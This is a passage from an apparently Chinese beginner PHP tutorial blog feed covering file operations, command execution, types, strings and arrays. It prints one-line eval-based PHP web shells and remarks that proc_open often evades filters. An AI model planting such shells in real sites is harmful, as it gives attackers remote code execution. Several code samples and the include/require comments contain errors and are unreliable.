title="打开"></a>打开</h4><p><code>fopen()</code>方式打开文件</p><table><thead><tr><th><strong>参数</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>‘r’</td><td>只读方式打开，将文件指针指向文件头</td></tr><tr><td>‘r+’</td><td>读写方式打开，将文件指针指向文件头</td></tr><tr><td>‘w’</td><td>写入方式打开，将文件指针指向文件头并将文件大小截为零。若文件不存在则尝试创建</td></tr><tr><td>‘w+’</td><td>读写方式打开，将文件指针指向文件头并将文件大小截为零。若文件不存在则尝试创建</td></tr><tr><td>‘a’</td><td>写入方式打开，将文件指针指向文件末尾。若文件不存在则尝试创建</td></tr><tr><td>‘a+’</td><td>读写方式打开，将文件指针指向文件末尾。若文件不存在则尝试创建</td></tr></tbody></table><hr><h4 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h4><p><code>fread()</code> 读取指定长度的字符串<br><code>fgets()</code> 读取文件一行内容，并将指针下移一行<br><code>file_get_contents()</code> 读取文件全部内容<br><code>feof()</code> 检测文件指针是否已到达文件末尾</p><h4 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h4><p><code>fwrite()</code> 写入数据</p><h4 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h4><p><code>fclose()</code> 关闭文件</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p><code>filesize()</code> 获取文件大小<br><code>is_readable()</code>和<code>is_writeable()</code> 判断文件在是否存在的基础上，是否可读或可写<br><code>is_file</code>和<code>file_exists</code> 判断指定路径是否存在某个文件</p><hr><h3 id="简单命令执行"><a href="#简单命令执行" class="headerlink" title="简单命令执行"></a>简单命令执行</h3><p>PHP中执行PHP代码<br><code>eval()、assert()</code></p><p>PHP中执行系统命令：<br><code>system()</code> 输出并返回最后一行<code>shell</code>结果<br><code>exec()</code> 不输出结果，返回最后一行<code>shell</code>结果，所有结果可以保存到一个返回的数组里面<br><code>passthru()</code> 只调用命令，把命令的运行结果原样直接输出至标准输出设备上</p><p>其他：<br><code>popen()、shell_exec()、proc_open()、pcntl_exec()</code></p><h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>PHP脚本版：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>Java脚本版（C🔪）：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><hr><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><h3 id="解释性语言与编译型语言"><a href="#解释性语言与编译型语言" class="headerlink" title="解释性语言与编译型语言"></a>解释性语言与编译型语言</h3><ol><li><p>解释型语言</p><blockquote><p>如：<code>PHP</code>，<code>Python</code>，<code>Shell</code><br>由上到下解释每一行<br>特点：每次使用，每次解释，且需要解释器<br>兼容性问题基本没有</p></blockquote></li><li><p>编译型语言</p><blockquote><p>如：<code>C</code>,<code>C++</code>，<code>Java</code><br>需要编译才能执行（将文本文件<code>test.c</code>编译成二进制文件<code>test.exe</code>）<br>编译后生成二进制文件，让系统执行<br>特点：一次编译，多次使用；但跨平台性较弱，需要修改源码。<br>比如c语言有如下两个标准：</p><blockquote><p><code>c90+win</code>编译标准<br><code>c99+linux</code>编译标准<br>他们不能通用</p></blockquote></blockquote></li></ol><hr><h3 id="PHP与JSP"><a href="#PHP与JSP" class="headerlink" title="PHP与JSP"></a>PHP与JSP</h3><p>PHP适用于小型网站<br>JSP遵循java语法，且用于大型网站<br>中型网站两者混用</p><hr><h3 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h3><p>例子：</p><blockquote><p>使用php输出that’s ok</p><ol><li>使用双引号中插入单引号</li><li>使用单引号，但时加上转义字符<code>\</code></li></ol></blockquote><hr><h3 id="PHP中布尔类型特点"><a href="#PHP中布尔类型特点" class="headerlink" title="PHP中布尔类型特点"></a>PHP中布尔类型特点</h3><p>只要“错”就是“空”，但是一旦被赋为某种类型，就与“空”没有关系了</p><h3 id="常见网站搭建套路（铁三角）"><a href="#常见网站搭建套路（铁三角）" class="headerlink" title="常见网站搭建套路（铁三角）"></a>常见网站搭建套路（铁三角）</h3><blockquote><p><code>apache/nginx + php + mysql</code> 开源<code>(php)</code>全家桶<br><code>tomcat + jsp + oracle</code>     其中<code>java，oracle</code>不开源<br><code>iis + asp + mssql/access</code>    微软全家桶，贵，功能少，质量差(常见于建站早，更换搭建方式代价极高的网站)</p></blockquote><hr><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>以规则对抗规则，即防御规则对抗攻击规则<br>写100条防御语句，找出一条没被防御到的语句</p><p>fuzz：模糊规则</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP开发入门</title>
      <link href="/2018/12/12/PHP/"/>
      <url>/2018/12/12/PHP/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>本文主要为后端开发做个引子，对常见的或者常用的知识做个简介，包括PHP等一些入门级知识。</p><p><strong>注：补充知识放在文末</strong></p><hr><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="定义与概念"><a href="#定义与概念" class="headerlink" title="定义与概念"></a>定义与概念</h3><ul><li>PHP是嵌入HTML页面中的脚本语言</li><li>是目前最流行的网站开发语言</li><li>在几乎所有的平台中都可以运行</li><li>很多的企业都在使用PHP作为开发语言</li></ul><hr><h3 id="Windows10-Sublime配置"><a href="#Windows10-Sublime配置" class="headerlink" title="Windows10 Sublime配置"></a>Windows10 Sublime配置</h3><p><a href="http://www.sublimetext.com/" target="_blank" rel="noopener">Sublime官网</a><br>这里选择windows版下载安装。<br>步骤如下：</p><ol><li>打开Sublime编辑器，输入如下代码：<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined">&#123;<br>&quot;cmd&quot;: [&quot;php&quot;, &quot;$file&quot;],<br>&quot;file_regex&quot;: &quot;php$&quot;,<br>&quot;selector&quot;: &quot;source.php&quot;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>一般保存至默认路径即可，如若默认路径有变，则手动选择如下路径：<br><code>C:\User(用户)\{YourName}\AppData\Roaming\Sublime Text3\Packages\User\</code></p><ol start="2"><li>添加PHP环境变量：<br>在<a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">phpStudy安装</a>目录中，找到php目录下你想使用的对应php版本，比如这里我选择php-7.0.12-nts。<br>进入文件夹，复制路径。</li></ol><p>打开系统环境变量添加所复制的路径，这里我使用如下方法：</p><blockquote><p>右击计算机–&gt;属性–&gt;高级系统设置–&gt;环境变量–&gt;系统变量</p></blockquote><p>找到变量Path，编辑并新建值，复制php路径，确认并退出。</p><ol start="3"><li><p>在Sublime编辑器选项卡中依次打开：<br><code>Tools--&gt;Build System--&gt;php</code><br>这里会出现<code>php</code>选项，是由于第一步文件的配置以及第二步环境变量配置均无误，否则将不会出现这个选项。</p></li><li><p>配置完成<br>快捷键：<code>Ctrl + b</code>即可输出显示php被解释后的运行结果。</p></li></ol><hr><h3 id="基础规范"><a href="#基础规范" class="headerlink" title="基础规范"></a>基础规范</h3><blockquote><ol><li>PHP脚本以<code>&lt;?php</code>开始，以<code>?&gt;</code>结束为规范写法。若为最后一行，可以省略<code>?&gt;</code></li><li>PHP 脚本可以单独存在，也可以与html页面结合</li><li>php文件扩展名规范，一般是<code>.php</code>结尾。但是，也可以使用其他命名，如<code>.phtml</code>等，具体是定义在配置文件中的。</li></ol></blockquote><hr><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><blockquote><p>布尔类型<code>（bool）</code><br>整型<code>（int）</code><br>浮点型<code>（float）</code><br>字符串<code>（string)</code><br>资源<code>（resource）</code><br>空类型<code>（NULL）</code><br>数组<code>（array）</code><br>对象<code>（class）</code></p></blockquote><p>一般可使用<code>var_dump()</code>来查看类型</p><h3 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h3><p>常量：</p><blockquote><p>一旦赋值不会改变，且应尽量使用大写。<br>常量分为系统常量和自定义常量。<br>系统常量可以理解为值不会有改变的量</p></blockquote><p>定义常量</p><blockquote><p>使用PHP中的函数<code>define()</code>定义自定义常量<br>常量在使用时，不需要<code>$</code>符号<br>常用定义：<code>Define(&#39;ROOT&#39;,&#39;localhost&#39;);</code></p></blockquote><p>常用系统常量：</p><blockquote><p><code>__FILE__</code>：php程序文件名/绝对路径<br><code>__DIR__</code>：被调用的文件脚本所在目录<br><code>__FUNCTION__</code>：函数名<br><code>__LINE__</code>：PHP程序文件行数<br><code>PHP_VERSION</code>：当前解析器的版本号<br><code>PHP_OS</code>：执行当前PHP版本的操作系统名称</p></blockquote><hr><p>变量：</p><blockquote><p>变量以<code>$</code>符开始，后面跟着变量名称<br>变量必须以字母或下划线字符开始、只能包含字母数字字符以及下划线（A-z、0-9和_）<br>变量名不能包含空格，且区分大小写。</p></blockquote><hr><h3 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h3><p>输出：<br><code>echo、print、printf、sprintf、print_r、die、var_dump</code></p><p>输入：<br>cli命令行模式接收参数：三种方式</p><blockquote><p>使用argv数组、使用getopt方法、提示用户输入</p></blockquote><p>argv：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs undefined">&lt;?php<br>/**<br> * 使用 $argc $argv 接受参数<br> */<br> <br>echo &quot;接收到&#123;$argc&#125;个参数&quot;;<br>print_r($argv);<br>?&gt;<br></code></pre></td></tr></table></figure></p><p>getopt:<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs undefined">&lt;?php<br>/**<br> * 使用 getopt函数<br> */<br> <br>$param_arr = getopt(&apos;a:b:&apos;);<br>print_r($param_arr);<br>?&gt;<br></code></pre></td></tr></table></figure></p><p>提示用户输入：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs undefined">&lt;?php<br>/**<br> * 提示用户输入，类似Python<br> */<br>fwrite(STDOUT,&apos;请输入您的博客名：&apos;);<br>echo &apos;您输入的信息是：&apos;.fgets(STDIN);<br>?&gt;<br></code></pre></td></tr></table></figure></p><p><strong>php的单双引号都能输出字符串，双引号中内部变量会解析，但在单引号中不会。</strong></p><hr><h3 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h3><p>PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字串的方法。</p><p>使用概述：</p><blockquote><ol><li>必须后接分号，否则编译不通过</li><li>EOF可以用任意其它字符代替，只需保证结束标识与开始标识一致</li><li>结束标识必须顶格独自占一行，前后不能衔接任何空白字符</li><li>开始标识可以不单引号或双引号，不带引号与带双引号效果一致，均解释内嵌的变量和转义符号，但带单引号则不解释。</li><li>当内容需要内嵌引号（单、双引号）时，不需要加转义符，本身对单双引号转义。</li></ol></blockquote><hr><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>比较运算符：</p><blockquote><p>大于、小于、等于等运算，它们的结果都是bool值类型</p></blockquote><p>逻辑运算符：</p><blockquote><p>与或非运算<br>and或&amp;&amp;    or或||    not或!<br>它们的结果都是bool值</p></blockquote><hr><h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><p>常用字符串操作：</p><blockquote><p><code>.</code> 拼接运算符<br><code>addslashes()</code> 将预定义的字符（可能出现歧义的字符）添加反斜杠转义<code>\</code><br><code>bin2hex()</code> 将ASCII字符串转换为16进制<br><code>chr()</code> 将指定的ASCII值转换成字符<br><code>chop()</code> 移除字符串右侧字符，由自己指定，默认为空白字符<br><code>strlen() mb_strlen()</code> 长度计算，区别：<code>mb_strlen</code>可以计算中文字符串长度<br><code>crypt()</code> 对字符串单项加密，不可逆转，类似于做MD5值<br><code>htmlentities()</code> 将字符串转换为html实体(可用于防御xss攻击)<br>例如：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> htmlentities(<span class="hljs-string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);<br></code></pre></td></tr></table></figure></p></blockquote><blockquote><p><code>implode()</code> 返回一个由数组元素组合成的字符串，与<code>explode()</code>作用相反<br><code>md5()</code> 计算字符串的MD5值<br><code>md5_file()</code> 计算文件的MD5值<br><code>str_replace()</code> 替换字符串中的一部分（大小写<strong>敏感</strong>）<br><code>str_ireplace()</code> 替换字符串中的一部分（大小写<strong>不敏感</strong>）<br><code>str_split()</code> 把字符串分割到数组中，php4/5/7均支持，但无法按照指定的字符来做分割，split函数可以按照指定的字符来分割，与explode函数用法类似，split函数仅可在php4/5中使用，php7废除了此用法<br><code>strcmp</code> 比较两个字符串（大小写<strong>敏感</strong>）</p><blockquote><p>在<code>UTF-8</code>中，每个中文3字节<br>在<code>GBK</code>中，每个中文2字节<br>无论什么编码，英文每个字母占1字节</p></blockquote></blockquote><hr><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><ul><li><p>强制转换：(数据类型)数据变量</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(int)$var  (string)$var  (float)$var  (bool)$var<br></code></pre></td></tr></table></figure></li><li><p>使用具体类型函数转换</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">intval()  floatval()  strval()<br></code></pre></td></tr></table></figure></li><li><p>使用通用类型转换函数</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">settype(mixed <span class="hljs-keyword">var</span>, string type)<br></code></pre></td></tr></table></figure></li></ul><hr><h3 id="PHP是弱类型"><a href="#PHP是弱类型" class="headerlink" title="PHP是弱类型"></a>PHP是弱类型</h3><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">$a = <span class="hljs-number">1</span>;  $b = <span class="hljs-keyword">true</span>;<br>var_dump($a == $b);  <span class="hljs-comment">// 结果为true</span><br><br>var_dump((int)$b);<br>var_dump((int)str_replace(<span class="hljs-string">"1"</span>, <span class="hljs-string">""</span>, $a));<br></code></pre></td></tr></table></figure><hr><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>数组是特殊的变量，可以在单个变量中同时保存一个或一个以上的值，并可以同通过下标来访问其中某一个的值。用<code>array()</code>函数创建。同时PHP中数组可以存储任意类型的数据。<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">$arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'I am'</span>, <span class="hljs-string">'a'</span>, <span class="hljs-string">'array'</span>);<br></code></pre></td></tr></table></figure></p><p>PHP中数组可分为索引数组和关联数组，第三种叫多维数组</p><blockquote><p>索引数组：是指数组的键是整数的数组，且键的整数顺序从<code>0</code>开始<br>关联数组：是一种具有特殊索引方式的数组。不仅可以通过整数来索引它，还可以使用字符串或者其他类型的值（除了NULL）来索引它。</p></blockquote><hr><h4 id="赋值方式："><a href="#赋值方式：" class="headerlink" title="赋值方式："></a>赋值方式：</h4><ol><li>数组变量名后加一个中括号的方式赋值。且键一定为整数。<br><code>$a[1] = 0</code></li><li>用<code>array()</code>创建一个空数组，用<code>=&gt;</code>分隔左侧键和右侧值。</li><li>用<code>array()</code>创建一个空数组，直接在数组里用英文单引号或双引号赋值，数组会默认建立从0开始的整数的键</li></ol><h4 id="输出方式"><a href="#输出方式" class="headerlink" title="输出方式"></a>输出方式</h4><p>常用：</p><ol><li><p>直接使用键输出：</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    $score = <span class="hljs-keyword">array</span>(<span class="hljs-string">"Math"</span> =&gt; <span class="hljs-string">"数学"</span>);<br>    $scoreMaths = $score[<span class="hljs-string">"Maths"</span>];<br>    <span class="hljs-keyword">echo</span> $scoreMaths;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>使用foreach输出：</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    $project = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">"china"</span> =&gt; <span class="hljs-string">"语文"</span>,<br>        <span class="hljs-string">"Maths"</span> =&gt; <span class="hljs-string">"数学"</span>,<br>        <span class="hljs-string">"English"</span> =&gt; <span class="hljs-string">"英语"</span><br>    );<br><br>    <span class="hljs-keyword">foreach</span> ($project <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br /&gt;"</span>;<br>    <span class="hljs-keyword">echo</span> $key.<span class="hljs-string">"是"</span>.$value.<span class="hljs-string">"。"</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> $project[<span class="hljs-string">"Maths"</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="常用操作技巧"><a href="#常用操作技巧" class="headerlink" title="常用操作技巧"></a>常用操作技巧</h4><ul><li><code>count()</code>和<code>sizeof()</code> 统计数组下标个数，获取数组长度</li><li><code>each()</code> 返回当前元素键名和键值，并将内部指针向前移动</li><li><code>list()</code> 用于在一次操作中给一组变量赋值</li><li><code>sort()、asort()、ksort()</code> 正向排序</li><li><code>rsort()、arsort()、krsort()</code> 反向排序</li><li><code>array_count_values()</code> 统计数组下标值的个数</li><li><code>current()</code> 每个数组都有一个内部指针指向他的当前单元，初始指向插入到数组中的第一个元素</li><li><code>array_pad()</code> 数组之间首尾选择性追加</li><li><code>unset()</code> 销毁指定的变量</li><li><code>array_fill()</code> 用键值填充数组</li><li><code>array_combine()</code> 同过合并两个数组来创建一个新数组，其中一个数组元素为键名，另一个为键值</li><li><code>array_splice()</code> 从数组中移除元素，并用新元素取代它</li><li><code>array_unique()</code> 删除数组中重复值</li><li><code>array_flip()</code> 交换数组的键值和值</li><li><code>array_search()</code> 搜索数值</li></ul><hr><h4 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h4><p>通过参数列表可以传递信息到函数（以逗号作为分隔符）的表达式列表。参数类似于一个变量，通过传递参数可以使函数实现对参数的运算。<br>参数可以是任意类型的数据，具体要根据函数功能来确定。</p><hr><h4 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h4><p>常见：<br><code>isset()</code> 判断变量是否存在<br><code>strlen()</code> 计算字符串长度<br><code>var_dump()</code> 输出变量类型和具体内容（常用于调试）<br><code>mysql_connect()</code> 链接数据库<br><code>function_exists()</code> 判断函数是否存在</p><hr><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><p>编写一个函数，实现计算两个数大小比较，并返回最大值：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// return the max of the two</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">maxofmine</span><span class="hljs-params">($a, $b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>($a &lt; $b) &#123;<br>        <span class="hljs-keyword">return</span> $b;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> $a;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>编写一个函数，实现将两个数的值进行交换，无返回值：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// swap two variable's value</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swap</span><span class="hljs-params">(&amp;$a, &amp;$b)</span> </span>&#123;<br>    $tmp = $a;  $a = $b;  $b = $tmp;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>用函数实现<code>array_flip()</code><br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// function array_flip() implementation</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">array_flip_mine</span><span class="hljs-params">($array)</span> </span>&#123;<br>    <span class="hljs-keyword">foreach</span> ($array <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>        $arraytmp[] = <span class="hljs-keyword">array</span>($value =&gt; $key);<br>    &#125;<br>    <span class="hljs-keyword">return</span> $arraytmp;<br>&#125;<br></code></pre></td></tr></table></figure></p><hr><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="打开"><a href="#打开" class="headerlink" title="打开"></a>打开</h4><p><code>fopen()</code>方式打开文件</p><table><thead><tr><th><strong>参数</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>‘r’</td><td>只读方式打开，将文件指针指向文件头</td></tr><tr><td>‘r+’</td><td>读写方式打开，将文件指针指向文件头</td></tr><tr><td>‘w’</td><td>写入方式打开，将文件指针指向文件头并将文件大小截为零。若文件不存在则尝试创建</td></tr><tr><td>‘w+’</td><td>读写方式打开，将文件指针指向文件头并将文件大小截为零。若文件不存在则尝试创建</td></tr><tr><td>‘a’</td><td>写入方式打开，将文件指针指向文件末尾。若文件不存在则尝试创建</td></tr><tr><td>‘a+’</td><td>读写方式打开，将文件指针指向文件末尾。若文件不存在则尝试创建</td></tr></tbody></table><hr><h4 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h4><p><code>fread()</code> 读取指定长度的字符串<br><code>fgets()</code> 读取文件一行内容，并将指针下移一行<br><code>file_get_contents()</code> 读取文件全部内容<br><code>feof()</code> 检测文件指针是否已到达文件末尾</p><h4 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h4><p><code>fwrite()</code> 写入数据</p><h4 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h4><p><code>fclose()</code> 关闭文件</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p><code>filesize()</code> 获取文件大小<br><code>is_readable()</code>和<code>is_writeable()</code> 判断文件在是否存在的基础上，是否可读或可写<br><code>is_file</code>和<code>file_exists</code> 判断指定路径是否存在某个文件</p><hr><h3 id="简单命令执行"><a href="#简单命令执行" class="headerlink" title="简单命令执行"></a>简单命令执行</h3><p>PHP中执行PHP代码<br><code>eval()、assert()</code></p><p>PHP中执行系统命令：<br><code>system()</code> 输出并返回最后一行<code>shell</code>结果<br><code>exec()</code> 不输出结果，返回最后一行<code>shell</code>结果，所有结果可以保存到一个返回的数组里面<br><code>passthru()</code> 只调用命令，把命令的运行结果原样直接输出至标准输出设备上</p><p>其他：<br><code>popen()、shell_exec()、proc_open()、pcntl_exec()</code><br>反引号实际上使用的shell_exec</p><p>一些例子：<br><code>exec()</code>：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">exec(<span class="hljs-string">'dir'</span>, $a);  <span class="hljs-comment">// exec返回值是一个数组</span><br><span class="hljs-keyword">foreach</span> ($a <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>    <span class="hljs-keyword">echo</span> $value.<span class="hljs-string">"&lt;br&gt;"</span>;<br>&#125;<br></code></pre></td></tr></table></figure></p><p><code>proc_open</code>（很少被过滤）：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">$arrayName = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"r"</span>),<br>    <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>),<br>    <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"file"</span>, <span class="hljs-string">"./tmp-error-output.txt"</span>, <span class="hljs-string">"a"</span>)<br>);<br><br>proc_open(<span class="hljs-string">'dir'</span>, $array, $pipes);<br><span class="hljs-keyword">foreach</span> ($pipes <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>    <span class="hljs-keyword">while</span>(!feof($value)) &#123;<br>        <span class="hljs-keyword">echo</span> fgets($file);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>PHP脚本版：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>Java脚本版（C🔪）：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><hr><h3 id="文件的包含"><a href="#文件的包含" class="headerlink" title="文件的包含"></a>文件的包含</h3><h4 id="include和require"><a href="#include和require" class="headerlink" title="include和require"></a>include和require</h4><p>通过include或require语句，可将PHP文件的内容插入另一个PHP文件（在服务器执行它之前）<br>异同：</p><blockquote><p><code>include</code>和<code>require</code>语句是相同的，除了错误处理方面：<br><code>require</code>会生成致命错误<code>E_COMPILE_ERROR</code>并停止脚本<br><code>include</code>只生成警告<code>E_WARNING</code>，并且脚本会继续<br><code>include_once</code>和<code>requre_once</code>语句相同，也是除了错误处理方面有所不同，同时，他们只会包含此次，不会重复包含。</p></blockquote><hr><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">'filename'</span>;  <span class="hljs-comment">// include会在php文件开始运行的时候包含</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">'filename'</span>;  <span class="hljs-comment">// require会在php文件运行到require关键字时包含</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">'filename'</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">'filenmae'</span>;<br></code></pre></td></tr></table></figure><hr><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><h3 id="解释性语言与编译型语言"><a href="#解释性语言与编译型语言" class="headerlink" 